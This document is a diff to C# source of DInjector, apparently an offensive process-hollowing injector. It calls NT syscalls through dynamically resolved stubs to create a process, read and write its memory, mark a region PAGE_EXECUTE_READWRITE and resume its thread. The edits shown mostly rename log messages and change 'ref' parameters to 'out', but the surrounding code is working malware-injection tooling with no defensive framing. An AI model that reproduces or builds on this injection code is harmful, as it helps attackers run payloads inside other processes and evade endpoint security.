@@ -42,7 +42,7 @@ namespace DInjector
             ref IntPtr BaseAddress,
             ref IntPtr RegionSize,
             uint NewProtect,
-            ref uint OldProtect);
+            out uint OldProtect);
 
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         delegate DI.Data.Native.NTSTATUS NtWriteVirtualMemory(
@@ -83,11 +83,11 @@ namespace DInjector
 
             if (result)
             {
-                Console.WriteLine("(Module) [+] CreateProcess");
+                Console.WriteLine("(ProcessHollow) [+] CreateProcess");
             }
             else
             {
-                Console.WriteLine("(Module) [-] CreateProcess");
+                Console.WriteLine("(ProcessHollow) [-] CreateProcess");
             }
 
             #endregion
@@ -112,11 +112,11 @@ namespace DInjector
 
             if (ntstatus == 0)
             {
-                Console.WriteLine("(Module) [+] NtAllocateVirtualMemory");
+                Console.WriteLine("(ProcessHollow) [+] NtAllocateVirtualMemory");
             }
             else
             {
-                Console.WriteLine($"(Module) [-] NtAllocateVirtualMemory: {ntstatus}");
+                Console.WriteLine($"(ProcessHollow) [-] NtAllocateVirtualMemory: {ntstatus}");
             }
 
             #endregion
@@ -142,11 +142,11 @@ namespace DInjector
 
             if (ntstatus == 0)
             {
-                Console.WriteLine("(Module) [+] NtReadVirtualMemory");
+                Console.WriteLine("(ProcessHollow) [+] NtReadVirtualMemory");
             }
             else
             {
-                Console.WriteLine($"(Module) [-] NtReadVirtualMemory: {ntstatus}");
+                Console.WriteLine($"(ProcessHollow) [-] NtReadVirtualMemory: {ntstatus}");
             }
 
             byte[] baseAddressBytes = new byte[bytesRead];
@@ -167,11 +167,11 @@ namespace DInjector
 
             if (ntstatus == 0)
             {
-                Console.WriteLine("(Module) [+] NtReadVirtualMemory");
+                Console.WriteLine("(ProcessHollow) [+] NtReadVirtualMemory");
             }
             else
             {
-                Console.WriteLine($"(Module) [-] NtReadVirtualMemory: {ntstatus}");
+                Console.WriteLine($"(ProcessHollow) [-] NtReadVirtualMemory: {ntstatus}");
             }
 
             byte[] dataBytes = new byte[bytesRead];
@@ -189,7 +189,7 @@ namespace DInjector
 
             #endregion
 
-            #region NtProtectVirtualMemory
+            #region NtProtectVirtualMemory (PAGE_EXECUTE_READWRITE)
 
             stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtProtectVirtualMemory");
             NtProtectVirtualMemory sysNtProtectVirtualMemory = (NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtProtectVirtualMemory));
@@ -203,15 +203,15 @@ namespace DInjector
                 ref protectAddress,
                 ref regionSize,
                 DI.Data.Win32.WinNT.PAGE_EXECUTE_READWRITE,
-                ref oldProtect);
+                out oldProtect);
 
             if (ntstatus == 0)
             {
-                Console.WriteLine("(Module) [+] NtProtectVirtualMemory");
+                Console.WriteLine("(ProcessHollow) [+] NtProtectVirtualMemory, PAGE_EXECUTE_READWRITE");
             }
             else
             {
-                Console.WriteLine($"(Module) [-] NtProtectVirtualMemory: {ntstatus}");
+                Console.WriteLine($"(ProcessHollow) [-] NtProtectVirtualMemory, PAGE_EXECUTE_READWRITE: {ntstatus}");
             }
 
             #endregion
@@ -236,33 +236,31 @@ namespace DInjector
 
             if (ntstatus == 0)
             {
-                Console.WriteLine("(Module) [+] NtWriteVirtualMemory");
+                Console.WriteLine("(ProcessHollow) [+] NtWriteVirtualMemory");
             }
             else
             {
-                Console.WriteLine($"(Module) [-] NtWriteVirtualMemory: {ntstatus}");
+                Console.WriteLine($"(ProcessHollow) [-] NtWriteVirtualMemory: {ntstatus}");
             }
 
             #endregion
 
-            #region NtProtectVirtualMemory
-
-            uint tmpProtect = 0;
+            #region NtProtectVirtualMemory (oldProtect)
 
             ntstatus = sysNtProtectVirtualMemory(
                 hProcess,
                 ref protectAddress,
                 ref regionSize,
                 oldProtect,
-                ref tmpProtect);
+                out uint _);
 
             if (ntstatus == 0)
             {
-                Console.WriteLine("(Module) [+] NtProtectVirtualMemory");
+                Console.WriteLine("(ProcessHollow) [+] NtProtectVirtualMemory, oldProtect");
             }
             else
             {
-                Console.WriteLine($"(Module) [-] NtProtectVirtualMemory: {ntstatus}");
+                Console.WriteLine($"(ProcessHollow) [-] NtProtectVirtualMemory, oldProtect: {ntstatus}");
             }
 
             #endregion
@@ -280,11 +278,11 @@ namespace DInjector
 
             if (ntstatus == 0)
             {
-                Console.WriteLine("(Module) [+] NtResumeThread");
+                Console.WriteLine("(ProcessHollow) [+] NtResumeThread");
             }
             else
             {
-                Console.WriteLine($"(Module) [-] NtResumeThread: {ntstatus}");
+                Console.WriteLine($"(ProcessHollow) [-] NtResumeThread: {ntstatus}");
             }
 
             #endregion
